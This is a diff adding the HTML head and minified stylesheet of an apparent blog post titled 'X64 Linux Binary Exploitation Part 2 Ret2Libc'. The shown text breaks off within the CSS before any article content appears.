@@ -1,0 +1,1742 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <title>X64 Linux Binary Exploitation Part 2 Ret2Libc</title>
+  <meta name='description' content='Buffer Buffer Overflows'>
+
+  <link rel="canonical" href="http://localhost:4000/2022/12/10/stack-based-overflows-on-64bit-linux-2/">
+  <link rel="alternate" type="application/rss+xml" title=":~$ Knuckle$ecurity_" href="/feed.xml">
+
+  <!-- Fonts -->
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700;900&display=swap" rel="stylesheet">
+
+  <!-- Ionicons -->
+  <link href="https://unpkg.com/ionicons@4.2.2/dist/css/ionicons.min.css" rel="stylesheet">
+
+  <script src="https://kit.fontawesome.com/b8cebea34c.js" crossorigin="anonymous"></script>
+
+  <style>
+  
+  /*!------------------------------------------------------------------
+[MAIN STYLESHEET]
+-------------------------------------------------------------------*/@import url("https://fonts.googleapis.com/css2?family=Poppins&family=Roboto+Mono:ital@1&family=Space+Mono&display=swap");@import url("https://fonts.googleapis.com/css2?family=Poppins&family=Roboto+Mono:ital@1&family=Space+Mono&display=swap");@import url("https://fonts.googleapis.com/css2?family=Poppins&family=Roboto+Mono:ital@1&family=Space+Mono&display=swap");.block{display:block}.inline-block{display:inline-block}.inline{display:inline}.show{display:block}.hide{display:none}.invisible{visibility:hidden}.list-reset{list-style-type:none;margin:0;padding:0}.clearfix::after,.clearfix ::before{content:"";display:table;clear:both}.screen-reader-text{clip:rect(1px, 1px, 1px, 1px);height:1px;overflow:hidden;position:absolute !important;width:1px;word-wrap:normal !important}/*! normalize.css v8.0.0 | MIT License | github.com/necolas/normalize.css */html{line-height:1.15;-webkit-text-size-adjust:100%}body{margin:0}h1{font-size:2em;margin:0.67em 0}hr{box-sizing:content-box;height:0;overflow:visible}pre{font-family:monospace, monospace;font-size:1em}a{background-color:transparent}abbr[title]{border-bottom:none;text-decoration:underline;text-decoration:underline dotted}b,strong{font-weight:bolder}code,kbd,samp{font-family:monospace, monospace;font-size:1em}small{font-size:80%}sub,sup{font-size:75%;line-height:0;position:relative;vertical-align:baseline}sub{bottom:-0.25em}sup{top:-0.5em}img{border-style:none}button,input,optgroup,select,textarea{font-family:inherit;font-size:100%;line-height:1.15;margin:0}button,input{overflow:visible}button,select{text-transform:none}button,[type="button"],[type="reset"],[type="submit"]{-webkit-appearance:button}button::-moz-focus-inner,[type="button"]::-moz-focus-inner,[type="reset"]::-moz-focus-inner,[type="submit"]::-moz-focus-inner{border-style:none;padding:0}button:-moz-focusring,[type="button"]:-moz-focusring,[type="reset"]:-moz-focusring,[type="submit"]:-moz-focusring{outline:1px dotted ButtonText}fieldset{padding:0.35em 0.75em 0.625em}legend{box-sizing:border-box;color:inherit;display:table;max-width:100%;padding:0;white-space:normal}progress{vertical-align:baseline}textarea{overflow:auto}[type="checkbox"],[type="radio"]{box-sizing:border-box;padding:0}[type="number"]::-webkit-inner-spin-button,[type="number"]::-webkit-outer-spin-button{height:auto}[type="search"]{-webkit-appearance:textfield;outline-offset:-2px}[type="search"]::-webkit-search-decoration{-webkit-appearance:none}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}details{display:block}summary{display:list-item}template{display:none}[hidden]{display:none}body,h1,h2,h3,h4,h5,h6,p,blockquote,pre,dl,dd,ol,ul,fieldset,legend,figure,hr{margin:0;padding:0}li>ul,li>ol{margin-bottom:0}table{border-collapse:collapse;border-spacing:0}h1,h2,h3,h4,h5,h6,ul,ol,dl,blockquote,p,address,hr,table,fieldset,figure,pre{margin-bottom:30px}ul,ol,dd{margin-left:20px}.highlight{border-radius:4px;color:#fff;background:#17151E}.highlighter-rouge .highlight{background:#eef}.highlight .c{color:#998;font-style:italic}.highlight .err{color:#a61717;background-color:#e3d2d2}.highlight .k{font-weight:bold}.highlight .o{font-weight:bold}.highlight .cm{color:#998;font-style:italic}.highlight .cp{color:#999;font-weight:bold}.highlight .c1{color:#998;font-style:italic}.highlight .cs{color:#999;font-weight:bold;font-style:italic}.highlight .gd{color:#000;background-color:#fdd}.highlight .gd .x{color:#000;background-color:#faa}.highlight .ge{font-style:italic}.highlight .gr{color:#a00}.highlight .gh{color:#999}.highlight .gi{color:#000;background-color:#dfd}.highlight .gi .x{color:#000;background-color:#afa}.highlight .go{color:#888}.highlight .gp{color:#555}.highlight .gs{font-weight:bold}.highlight .gu{color:#fff}.highlight .gt{color:#a00}.highlight .kc{font-weight:bold}.highlight .kd{font-weight:bold}.highlight .kp{font-weight:bold}.highlight .kr{font-weight:bold}.highlight .kt{color:#458;font-weight:bold}.highlight .m{color:#099}.highlight .s{color:#d85858}.highlight .na{color:#008080}.highlight .nb{color:#0086B3}.highlight .nc{color:#458;font-weight:bold}.highlight .no{color:#008080}.highlight .ni{color:#800080}.highlight .ne{color:#900;font-weight:bold}.highlight .nf{color:#900;font-weight:bold}.highlight .nn{color:#555}.highlight .nt{color:#6565ff}.highlight .nv{color:#008080}.highlight .ow{font-weight:bold}.highlight .w{color:#bbb}.highlight .mf{color:#099}.highlight .mh{color:#099}.highlight .mi{color:#099}.highlight .mo{color:#099}.highlight .sb{color:#d85858}.highlight .sc{color:#d85858}.highlight .sd{color:#d85858}.highlight .s2{color:#d85858}.highlight .se{color:#d85858}.highlight .sh{color:#d85858}.highlight .si{color:#d85858}.highlight .sx{color:#d85858}.highlight .sr{color:#009926}.highlight .s1{color:#d85858}.highlight .ss{color:#990073}.highlight .bp{color:#999}.highlight .vc{color:#008080}.highlight .vg{color:#008080}.highlight .vi{color:#008080}.highlight .il{color:#099}.container{max-width:1340px;padding-left:20px;padding-right:20px;margin:0 auto}.container-big{max-width:1600px;padding-left:20px;padding-right:20px;margin:0 auto}.row{display:flex;flex-wrap:wrap;flex:0 1 auto;flex-direction:row;box-sizing:border-box;margin-left:-16px;margin-right:-16px}.col{padding-left:16px;padding-right:16px}[class^="col-"]{flex:auto}.col-0{width:0%}.col-1{width:8.3333333333%}.col-2{width:16.6666666667%}.col-3{width:25%}.col-4{width:33.3333333333%}.col-5{width:41.6666666667%}.col-6{width:50%}.col-7{width:58.3333333333%}.col-8{width:66.6666666667%}.col-9{width:75%}.col-10{width:83.3333333333%}.col-11{width:91.6666666667%}.col-12{width:100%}.push-0{margin-left:0%}.push-1{margin-left:8.3333333333%}.push-2{margin-left:16.6666666667%}.push-3{margin-left:25%}.push-4{margin-left:33.3333333333%}.push-5{margin-left:41.6666666667%}.push-6{margin-left:50%}.push-7{margin-left:58.3333333333%}.push-8{margin-left:66.6666666667%}.push-9{margin-left:75%}.push-10{margin-left:83.3333333333%}.push-11{margin-left:91.6666666667%}.push-12{margin-left:100%}.pull-0{margin-right:0%}.pull-1{margin-right:8.3333333333%}.pull-2{margin-right:16.6666666667%}.pull-3{margin-right:25%}.pull-4{margin-right:33.3333333333%}.pull-5{margin-right:41.6666666667%}.pull-6{margin-right:50%}.pull-7{margin-right:58.3333333333%}.pull-8{margin-right:66.6666666667%}.pull-9{margin-right:75%}.pull-10{margin-right:83.3333333333%}.pull-11{margin-right:91.6666666667%}.pull-12{margin-right:100%}@media (max-width: 992px){.col-d-0{width:0%}.col-d-1{width:8.3333333333%}.col-d-2{width:16.6666666667%}.col-d-3{width:25%}.col-d-4{width:33.3333333333%}.col-d-5{width:41.6666666667%}.col-d-6{width:50%}.col-d-7{width:58.3333333333%}.col-d-8{width:66.6666666667%}.col-d-9{width:75%}.col-d-10{width:83.3333333333%}.col-d-11{width:91.6666666667%}.col-d-12{width:100%}.push-d-0{margin-left:0%}.push-d-1{margin-left:8.3333333333%}.push-d-2{margin-left:16.6666666667%}.push-d-3{margin-left:25%}.push-d-4{margin-left:33.3333333333%}.push-d-5{margin-left:41.6666666667%}.push-d-6{margin-left:50%}.push-d-7{margin-left:58.3333333333%}.push-d-8{margin-left:66.6666666667%}.push-d-9{margin-left:75%}.push-d-10{margin-left:83.3333333333%}.push-d-11{margin-left:91.6666666667%}.push-d-12{margin-left:100%}.pull-d-0{margin-right:0%}.pull-d-1{margin-right:8.3333333333%}.pull-d-2{margin-right:16.6666666667%}.pull-d-3{margin-right:25%}.pull-d-4{margin-right:33.3333333333%}.pull-d-5{margin-right:41.6666666667%}.pull-d-6{margin-right:50%}.pull-d-7{margin-right:58.3333333333%}.pull-d-8{margin-right:66.6666666667%}.pull-d-9{margin-right:75%}.pull-d-10{margin-right:83.3333333333%}.pull-d-11{margin-right:91.6666666667%}.pull-d-12{margin-right:100%}}@media (max-width: 768px){.col-t-0{width:0%}.col-t-1{width:8.3333333333%}.col-t-2{width:16.6666666667%}.col-t-3{width:25%}.col-t-4{width:33.3333333333%}.col-t-5{width:41.6666666667%}.col-t-6{width:50%}.col-t-7{width:58.3333333333%}.col-t-8{width:66.6666666667%}.col-t-9{width:75%}.col-t-10{width:83.3333333333%}.col-t-11{width:91.6666666667%}.col-t-12{width:100%}.push-t-0{margin-left:0%}.push-t-1{margin-left:8.3333333333%}.push-t-2{margin-left:16.6666666667%}.push-t-3{margin-left:25%}.push-t-4{margin-left:33.3333333333%}.push-t-5{margin-left:41.6666666667%}.push-t-6{margin-left:50%}.push-t-7{margin-left:58.3333333333%}.push-t-8{margin-left:66.6666666667%}.push-t-9{margin-left:75%}.push-t-10{margin-left:83.3333333333%}.push-t-11{margin-left:91.6666666667%}.push-t-12{margin-left:100%}.pull-t-0{margin-right:0%}.pull-t-1{margin-right:8.3333333333%}.pull-t-2{margin-right:16.6666666667%}.pull-t-3{margin-right:25%}.pull-t-4{margin-right:33.3333333333%}.pull-t-5{margin-right:41.6666666667%}.pull-t-6{margin-right:50%}.pull-t-7{margin-right:58.3333333333%}.pull-t-8{margin-right:66.6666666667%}.pull-t-9{margin-right:75%}.pull-t-10{margin-right:83.3333333333%}.pull-t-11{margin-right:91.6666666667%}.pull-t-12{margin-right:100%}}@media (max-width: 576px){.col-m-0{width:0%}.col-m-1{width:8.3333333333%}.col-m-2{width:16.6666666667%}.col-m-3{width:25%}.col-m-4{width:33.3333333333%}.col-m-5{width:41.6666666667%}.col-m-6{width:50%}.col-m-7{width:58.3333333333%}.col-m-8{width:66.6666666667%}.col-m-9{width:75%}.col-m-10{width:83.3333333333%}.col-m-11{width:91.6666666667%}.col-m-12{width:100%}.push-m-0{margin-left:0%}.push-m-1{margin-left:8.3333333333%}.push-m-2{margin-left:16.6666666667%}.push-m-3{margin-left:25%}.push-m-4{margin-left:33.3333333333%}.push-m-5{margin-left:41.6666666667%}.push-m-6{margin-left:50%}.push-m-7{margin-left:58.3333333333%}.push-m-8{margin-left:66.6666666667%}.push-m-9{margin-left:75%}.push-m-10{margin-left:83.3333333333%}.push-m-11{margin-left:91.6666666667%}.push-m-12{margin-left:100%}.pull-m-0{margin-right:0%}.pull-m-1{margin-right:8.3333333333%}.pull-m-2{margin-right:16.6666666667%}.pull-m-3{margin-right:25%}.pull-m-4{margin-right:33.3333333333%}.pull-m-5{margin-right:41.6666666667%}.pull-m-6{margin-right:50%}.pull-m-7{margin-right:58.3333333333%}.pull-m-8{margin-right:66.6666666667%}.pull-m-9{margin-right:75%}.pull-m-10{margin-right:83.3333333333%}.pull-m-11{margin-right:91.6666666667%}.pull-m-12{margin-right:100%}}@media (max-width: 992px){.col-d-0{width:0%}.col-d-1{width:8.3333333333%}.col-d-2{width:16.6666666667%}.col-d-3{width:25%}.col-d-4{width:33.3333333333%}.col-d-5{width:41.6666666667%}.col-d-6{width:50%}.col-d-7{width:58.3333333333%}.col-d-8{width:66.6666666667%}.col-d-9{width:75%}.col-d-10{width:83.3333333333%}.col-d-11{width:91.6666666667%}.col-d-12{width:100%}.push-d-0{margin-left:0%}.push-d-1{margin-left:8.3333333333%}.push-d-2{margin-left:16.6666666667%}.push-d-3{margin-left:25%}.push-d-4{margin-left:33.3333333333%}.push-d-5{margin-left:41.6666666667%}.push-d-6{margin-left:50%}.push-d-7{margin-left:58.3333333333%}.push-d-8{margin-left:66.6666666667%}.push-d-9{margin-left:75%}.push-d-10{margin-left:83.3333333333%}.push-d-11{margin-left:91.6666666667%}.push-d-12{margin-left:100%}.pull-d-0{margin-right:0%}.pull-d-1{margin-right:8.3333333333%}.pull-d-2{margin-right:16.6666666667%}.pull-d-3{margin-right:25%}.pull-d-4{margin-right:33.3333333333%}.pull-d-5{margin-right:41.6666666667%}.pull-d-6{margin-right:50%}.pull-d-7{margin-right:58.3333333333%}.pull-d-8{margin-right:66.6666666667%}.pull-d-9{margin-right:75%}.pull-d-10{margin-right:83.3333333333%}.pull-d-11{margin-right:91.6666666667%}.pull-d-12{margin-right:100%}}@media (max-width: 768px){.col-t-0{width:0%}.col-t-1{width:8.3333333333%}.col-t-2{width:16.6666666667%}.col-t-3{width:25%}.col-t-4{width:33.3333333333%}.col-t-5{width:41.6666666667%}.col-t-6{width:50%}.col-t-7{width:58.3333333333%}.col-t-8{width:66.6666666667%}.col-t-9{width:75%}.col-t-10{width:83.3333333333%}.col-t-11{width:91.6666666667%}.col-t-12{width:100%}.push-t-0{margin-left:0%}.push-t-1{margin-left:8.3333333333%}.push-t-2{margin-left:16.6666666667%}.push-t-3{margin-left:25%}.push-t-4{margin-left:33.3333333333%}.push-t-5{margin-left:41.6666666667%}.push-t-6{margin-left:50%}.push-t-7{margin-left:58.3333333333%}.push-t-8{margin-left:66.6666666667%}.push-t-9{margin-left:75%}.push-t-10{margin-left:83.3333333333%}.push-t-11{margin-left:91.6666666667%}.push-t-12{margin-left:100%}.pull-t-0{margin-right:0%}.pull-t-1{margin-right:8.3333333333%}.pull-t-2{margin-right:16.6666666667%}.pull-t-3{margin-right:25%}.pull-t-4{margin-right:33.3333333333%}.pull-t-5{margin-right:41.6666666667%}.pull-t-6{margin-right:50%}.pull-t-7{margin-right:58.3333333333%}.pull-t-8{margin-right:66.6666666667%}.pull-t-9{margin-right:75%}.pull-t-10{margin-right:83.3333333333%}.pull-t-11{margin-right:91.6666666667%}.pull-t-12{margin-right:100%}}@media (max-width: 576px){.col-m-0{width:0%}.col-m-1{width:8.3333333333%}.col-m-2{width:16.6666666667%}.col-m-3{width:25%}.col-m-4{width:33.3333333333%}.col-m-5{width:41.6666666667%}.col-m-6{width:50%}.col-m-7{width:58.3333333333%}.col-m-8{width:66.6666666667%}.col-m-9{width:75%}.col-m-10{width:83.3333333333%}.col-m-11{width:91.6666666667%}.col-m-12{width:100%}.push-m-0{margin-left:0%}.push-m-1{margin-left:8.3333333333%}.push-m-2{margin-left:16.6666666667%}.push-m-3{margin-left:25%}.push-m-4{margin-left:33.3333333333%}.push-m-5{margin-left:41.6666666667%}.push-m-6{margin-left:50%}.push-m-7{margin-left:58.3333333333%}.push-m-8{margin-left:66.6666666667%}.push-m-9{margin-left:75%}.push-m-10{margin-left:83.3333333333%}.push-m-11{margin-left:91.6666666667%}.push-m-12{margin-left:100%}.pull-m-0{margin-right:0%}.pull-m-1{margin-right:8.3333333333%}.pull-m-2{margin-right:16.6666666667%}.pull-m-3{margin-right:25%}.pull-m-4{margin-right:33.3333333333%}.pull-m-5{margin-right:41.6666666667%}.pull-m-6{margin-right:50%}.pull-m-7{margin-right:58.3333333333%}.pull-m-8{margin-right:66.6666666667%}.pull-m-9{margin-right:75%}.pull-m-10{margin-right:83.3333333333%}.pull-m-11{margin-right:91.6666666667%}.pull-m-12{margin-right:100%}}@media (max-width: 992px){.col-d-0{width:0%}.col-d-1{width:8.3333333333%}.col-d-2{width:16.6666666667%}.col-d-3{width:25%}.col-d-4{width:33.3333333333%}.col-d-5{width:41.6666666667%}.col-d-6{width:50%}.col-d-7{width:58.3333333333%}.col-d-8{width:66.6666666667%}.col-d-9{width:75%}.col-d-10{width:83.3333333333%}.col-d-11{width:91.6666666667%}.col-d-12{width:100%}.push-d-0{margin-left:0%}.push-d-1{margin-left:8.3333333333%}.push-d-2{margin-left:16.6666666667%}.push-d-3{margin-left:25%}.push-d-4{margin-left:33.3333333333%}.push-d-5{margin-left:41.6666666667%}.push-d-6{margin-left:50%}.push-d-7{margin-left:58.3333333333%}.push-d-8{margin-left:66.6666666667%}.push-d-9{margin-left:75%}.push-d-10{margin-left:83.3333333333%}.push-d-11{margin-left:91.6666666667%}.push-d-12{margin-left:100%}.pull-d-0{margin-right:0%}.pull-d-1{margin-right:8.3333333333%}.pull-d-2{margin-right:16.6666666667%}.pull-d-3{margin-right:25%}.pull-d-4{margin-right:33.3333333333%}.pull-d-5{margin-right:41.6666666667%}.pull-d-6{margin-right:50%}.pull-d-7{margin-right:58.3333333333%}.pull-d-8{margin-right:66.6666666667%}.pull-d-9{margin-right:75%}.pull-d-10{margin-right:83.3333333333%}.pull-d-11{margin-right:91.6666666667%}.pull-d-12{margin-right:100%}}@media (max-width: 768px){.col-t-0{width:0%}.col-t-1{width:8.3333333333%}.col-t-2{width:16.6666666667%}.col-t-3{width:25%}.col-t-4{width:33.3333333333%}.col-t-5{width:41.6666666667%}.col-t-6{width:50%}.col-t-7{width:58.3333333333%}.col-t-8{width:66.6666666667%}.col-t-9{width:75%}.col-t-10{width:83.3333333333%}.col-t-11{width:91.6666666667%}.col-t-12{width:100%}.push-t-0{margin-left:0%}.push-t-1{margin-left:8.3333333333%}.push-t-2{margin-left:16.6666666667%}.push-t-3{margin-left:25%}.push-t-4{margin-left:33.3333333333%}.push-t-5{margin-left:41.6666666667%}.push-t-6{margin-left:50%}.push-t-7{margin-left:58.3333333333%}.push-t-8{margin-left:66.6666666667%}.push-t-9{margin-left:75%}.push-t-10{margin-left:83.3333333333%}.push-t-11{margin-left:91.6666666667%}.push-t-12{margin-left:100%}.pull-t-0{margin-right:0%}.pull-t-1{margin-right:8.3333333333%}.pull-t-2{margin-right:16.6666666667%}.pull-t-3{margin-right:25%}.pull-t-4{margin-right:33.3333333333%}.pull-t-5{margin-right:41.6666666667%}.pull-t-6{margin-right:50%}.pull-t-7{margin-right:58.3333333333%}.pull-t-8{margin-right:66.6666666667%}.pull-t-9{margin-right:75%}.pull-t-10{margin-right:83.3333333333%}.pull-t-11{margin-right:91.6666666667%}.pull-t-12{margin-right:100%}}@media (max-width: 576px){.col-m-0{width:0%}.col-m-1{width:8.3333333333%}.col-m-2{width:16.6666666667%}.col-m-3{width:25%}.col-m-4{width:33.3333333333%}.col-m-5{width:41.6666666667%}.col-m-6{width:50%}.col-m-7{width:58.3333333333%}.col-m-8{width:66.6666666667%}.col-m-9{width:75%}.col-m-10{width:83.3333333333%}.col-m-11{width:91.6666666667%}.col-m-12{width:100%}.push-m-0{margin-left:0%}.push-m-1{margin-left:8.3333333333%}.push-m-2{margin-left:16.6666666667%}.push-m-3{margin-left:25%}.push-m-4{margin-left:33.3333333333%}.push-m-5{margin-left:41.6666666667%}.push-m-6{margin-left:50%}.push-m-7{margin-left:58.3333333333%}.push-m-8{margin-left:66.6666666667%}.push-m-9{margin-left:75%}.push-m-10{margin-left:83.3333333333%}.push-m-11{margin-left:91.6666666667%}.push-m-12{margin-left:100%}.pull-m-0{margin-right:0%}.pull-m-1{margin-right:8.3333333333%}.pull-m-2{margin-right:16.6666666667%}.pull-m-3{margin-right:25%}.pull-m-4{margin-right:33.3333333333%}.pull-m-5{margin-right:41.6666666667%}.pull-m-6{margin-right:50%}.pull-m-7{margin-right:58.3333333333%}.pull-m-8{margin-right:66.6666666667%}.pull-m-9{margin-right:75%}.pull-m-10{margin-right:83.3333333333%}.pull-m-11{margin-right:91.6666666667%}.pull-m-12{margin-right:100%}}img[data-action="zoom"]{cursor:pointer;cursor:-webkit-zoom-in;cursor:-moz-zoom-in}.zoom-img,.zoom-img-wrap{position:relative;z-index:999;-webkit-transition:all 300ms;-o-transition:all 300ms;transition:all 300ms}img.zoom-img{cursor:pointer;cursor:-webkit-zoom-out;cursor:-moz-zoom-out}.zoom-overlay{z-index:420;background:#000;position:fixed;top:0;left:0;right:0;bottom:0;pointer-events:none;opacity:0;-webkit-transition:opacity 300ms;-o-transition:opacity 300ms;transition:opacity 300ms}@supports (-webkit-backdrop-filter: none) or (backdrop-filter: none){.zoom-overlay{-webkit-backdrop-filter:saturate(180%) blur(24px);backdrop-filter:saturate(180%) blur(24px);background:rgba(0,0,0,0.8)}}.zoom-overlay-open .zoom-overlay{opacity:1}.zoom-overlay-open,.zoom-overlay-transitioning{cursor:default}.animate{animation:animateElement cubic-bezier(0.3, 0.45, 0.45, 0.95) 0.75s;animation-duration:0.75s;animation-iteration-count:1;transition:transform .2s}@keyframes animateElement{0%{opacity:0;transform:translate(0px, 50px)}100%{opacity:1;transform:translate(0px, 0px)}}*,*::after,*::before{box-sizing:border-box}body{font-family:'Poppins';font-size:20px;line-height:1.7;color:#eee;font-size:20px;background-color:#000;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale;overflow-x:hidden}body.is-in::after{visibility:hidden;opacity:0;pointer-events:none}body::after{content:"";position:fixed;left:0;top:0;width:100%;height:100%;background-color:#09080f;z-index:999;transition:1s}body input,body textarea{border:1px solid #eee;outline:none}@media only screen and (max-width: 576px){body{font-size:16px;line-height:29px}}::placeholder{color:#ccc}*::selection{color:#fff;background-color:rgba(144,0,0,0.7)}h1,h2,h3,h4,h5,h6{font-family:'Poppins';font-weight:900;line-height:1.4em;letter-spacing:-1px;color:#eee}h1{font-size:38px}h2{font-size:30px}h3{font-size:26px}h4{font-size:22px}h5{font-size:20px}h6{font-size:18px}blockquote{position:relative;padding:34px 20px 34px 64px;margin-bottom:0;font-size:28px;line-height:36px;font-weight:900;color:#fff}blockquote:before{content:'\201C';position:absolute;top:0.59em;left:-0.01em;font-size:4em;color:#900000}blockquote p{margin-bottom:20px}blockquote cite{font-size:16px;font-style:normal;font-weight:700;color:#eee}blockquote cite:before{content:'\2014' '\00a0'}@media only screen and (max-width: 576px){blockquote{padding:20px 20px 20px 48px;font-size:20px;line-height:28px}}pre{overflow:auto;padding:20px;font-size:14px;white-space:pre-wrap;word-wrap:break-word;word-break:break-all}code[class*=language-],pre[class*=language-]{white-space:pre-wrap;word-break:break-all;line-height:inherit}img,.zoom-img-wrap{max-width:100%;height:auto;vertical-align:middle}img+em,.zoom-img-wrap+em{display:inline-block;width:100%;padding:20px 0 0;font-size:12px;font-style:normal;line-height:1;text-align:center;color:#eee}a{text-decoration:none;color:#eee;transition:all 0.2s}a:hover{color:#900000}hr{display:block;width:100%;height:1px;margin:64px 0;border:0;background:#09080f}.table-container{display:block;max-width:100%;overflow-x:auto}table{font-size:12px;color:rgba(238,238,238,0.7);width:100%;border-width:1px;border-color:#09080f;border-collapse:collapse}table th{padding:12px;font-size:16px;text-align:left;border:1px solid #09080f;color:#fff;background-color:#17151E}table tr{background-color:#09080f;transition:all .3s ease}table tr:nth-child(even){background-color:transparent}table td{padding:12px;font-size:14px;border:1px solid #09080f}table tr:hover{color:#fff}.gallery-box{margin-bottom:30px}.gallery-box em{display:inline-block;width:100%;padding:20px 0 0;font-size:12px;font-style:normal;line-height:1;text-align:center;color:#eee}.gallery-box em a{border-bottom:2px solid rgba(238,238,238,0.1)}.gallery-box em a:hover{border-color:#900000;color:#eee;text-decoration:none}.gallery{display:grid;grid-template-columns:repeat(3, auto);justify-content:center;align-content:center;grid-gap:10px}.gallery img{width:100%;height:auto}.lazy{opacity:0;transition:0.4s ease}.lazy.loaded{opacity:1}.hero{position:relative;margin-bottom:310px;overflow:hidden;background-color:#09080f}@media only screen and (max-width: 576px){.hero{box-shadow:none;margin-bottom:32px}}.herosubpages{position:relative;margin-bottom:32px;overflow:hidden;background-color:#09080f}@media only screen and (max-width: 576px){.herosubpages{box-shadow:none}}.hero__inner::before{content:"";display:block;position:absolute;top:0;bottom:0;left:0;right:0;z-index:1;background:linear-gradient(180deg, rgba(15,14,21,0) 50%, #000 100%)}.hero__image{min-height:664px;user-select:none;background-color:#09080f}.hero__image img{position:absolute;top:0px;width:100%;height:100%;object-fit:cover}@media only screen and (max-width: 992px){.hero__image{min-height:620px}}@media only screen and (max-width: 768px){.hero__image{min-height:500px}}@media only screen and (max-width: 576px){.hero__image{min-height:400px}}.hero__content{position:absolute;top:60%;left:50%;transform:translate(-50%, -50%);z-index:1;width:100%;max-width:650px;padding:0 20px;text-align:center}.hero__title{font-family:'Poppins';font-size:35px;margin:0 0 10px;line-height:1;color:#fff;font-weight:lighter}@media only screen and (max-width: 576px){.hero__title{font-size:20px;margin:0 0 5px}}.hero__desc{font-family:'Poppins';font-size:15px;color:#ccc}@media only screen and (max-width: 576px){.hero__desc{font-size:11px;line-height:21px}}.hero-without-image{margin:192px 0 96px}.hero-without-image .hero-inner{display:flex;align-items:center;justify-content:center}.hero-without-image .hero-content{width:100%;max-width:650px;padding:0 20px;text-align:center}@media only screen and (max-width: 576px){.hero-without-image{margin:144px 0 48px}}.hero__scrdwn{width:6vmin;height:6vmin;box-sizing:border-box;left:50%;top:50%;background-color:black;border:none;background:none;transform:rotate(-225deg)}@media only screen and (max-width: 768px){.hero__scrdwn{display:none}}@media only screen and (max-width: 576px){.hero__scrdwn{display:none}}.hero__scrdwn::before{content:'';width:100%;height:89%;border-width:.8vmin .8vmin 0 0;border-style:solid;border-color:white;transition:.2s ease;display:block;transform-origin:100% 0;outline:none !important}.hero__scrdwn:hover::before{border-color:#900000;transform:scale(0.8)}.top{position:fixed;bottom:25px;right:-100px;z-index:5;width:40px;height:40px;line-height:40px;text-align:center;border-radius:8px;background-color:#09080f;color:#fff;cursor:pointer;transition:all .25s ease}.top:hover{color:#09080f;background:#900000}.top.is-active{right:30px}@media only screen and (max-width: 768px){.top{bottom:15px}.top.is-active{right:25px}}.header{font-family:'Poppins';width:100%;margin:35px 0;transition:all 0.2s;color:#fff}.header.header--top{position:absolute;top:0;z-index:100}@media only screen and (max-width: 992px){.header{margin:32px 0}}.header__inner{position:relative;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap}.logo__link{font-family:"Inter",-apple-system,BlinkMacSystemFont,"Segoe UI","Helvetica Neue",sans-serif;font-size:28px;line-height:1;font-weight:900;vertical-align:middle;color:#eee;text-transform:uppercase;text-decoration:none;letter-spacing:-1px}.logo__link:hover{color:#900000}.logo__image{max-height:120px}@media only screen and (max-width: 576px){.logo__image{max-height:80px}}.main-nav{width:100%;max-width:1300px;margin:0 auto}.main-nav__box{display:flex;align-items:center;width:80%;padding-top:200px;margin:0 auto}.main-nav__box .nav__icon-close{position:absolute;top:20px;right:40px;z-index:5;display:flex;align-items:center;justify-content:center;font-size:30px;width:40px;height:40px;text-align:center;line-height:40px;color:rgba(255,255,255,0.5);transition:all .25s ease;cursor:pointer}.main-nav__box .nav__icon-close:hover{color:#fff}@media only screen and (max-width: 768px){.main-nav__box{padding-top:100px}.main-nav__box .nav__icon-close{top:22px;right:42px}}@media only screen and (max-width: 576px){.main-nav__box{width:90%}}.navigation{display:flex;align-items:center}.top-nav .nav__list .nav__item{display:inline-block;margin-right:40px}.top-nav .nav__list .nav__item:last-child{margin-right:125px}.top-nav .nav__list .nav__item .nav__link{position:relative;font-size:16px;font-weight:700;letter-spacing:1px;text-transform:uppercase;text-decoration:none;color:#eee}.top-nav .nav__list .nav__item .nav__link:hover{color:#900000}@media only screen and (max-width: 992px){.top-nav{display:none}}.mobile-nav .nav__list .nav__item{display:block;margin-bottom:36px;text-align:center}.mobile-nav .nav__list .nav__item:last-child{margin-bottom:0}.mobile-nav .nav__list .nav__item .nav__link{position:relative;font-size:18px;font-weight:700;letter-spacing:1px;text-transform:uppercase;color:#eee}.mobile-nav .nav__list .nav__item .nav__link:hover{color:#900000}@media only screen and (max-width: 576px){.mobile-nav .nav__list .nav__item{margin-bottom:28px}}.nav-buttons{display:flex;align-items:center;font-size:24px;color:#eee}.nav-buttons .search-button{display:flex;align-items:center;cursor:pointer;transition:all 0.2s}.nav-buttons .search-button span{transition:all 0.2s}.nav-buttons .search-button:hover span{color:#900000}.nav-buttons .search-button span{display:block;margin-left:8px;font-size:12px;font-weight:700;letter-spacing:1px;text-transform:uppercase}@media only screen and (max-width: 992px){.nav-buttons .search-button span{display:none}}.nav-buttons .nav__icon-menu{display:none;margin-right:16px}@media only screen and (max-width: 992px){.nav-buttons .nav__icon-menu{display:block}}.nav-buttons .nav__icon{cursor:pointer}.menu-overlay{position:fixed;top:0;left:0;right:0;bottom:0;z-index:100;opacity:0;visibility:hidden;background-color:#09080f;transition:all 0.5s ease-in-out}.menu-overlay.is-open{opacity:1;visibility:visible}@supports (-webkit-backdrop-filter: none) or (backdrop-filter: none){.menu-overlay{-webkit-backdrop-filter:saturate(180%) blur(24px);backdrop-filter:saturate(180%) blur(24px);background-color:rgba(9,8,15,0.9)}}@media only screen and (min-width: 992px){.menu-overlay{display:none}}.nav-grid{width:100%;height:75vh;overflow-y:auto}.nav-grid__item{margin-bottom:30px}@media only screen and (max-width: 768px){.nav-grid__item{height:auto}}.nav-grid__title{position:relative;margin-bottom:48px;padding-bottom:15px;font-size:40px;text-align:center;color:#eee}.nav-grid__title::after{content:"";position:absolute;left:50%;bottom:0;transform:translate(-50%, -50%);display:block;width:25px;height:2px;background-color:#fff}@media only screen and (max-width: 768px){.nav-grid__title{margin-bottom:30px}}.search{position:fixed;top:0;left:0;right:0;bottom:0;z-index:100;overflow:auto;opacity:0;visibility:hidden;background-color:#09080f;transition:all 0.5s ease-in-out}.search.is-visible{opacity:1;visibility:visible}@supports (-webkit-backdrop-filter: none) or (backdrop-filter: none){.search{-webkit-backdrop-filter:saturate(180%) blur(24px);backdrop-filter:saturate(180%) blur(24px);background-color:rgba(9,8,15,0.9)}}.search__box{position:relative;max-width:540px;width:100%;margin:0 auto;padding-top:140px}.search__box 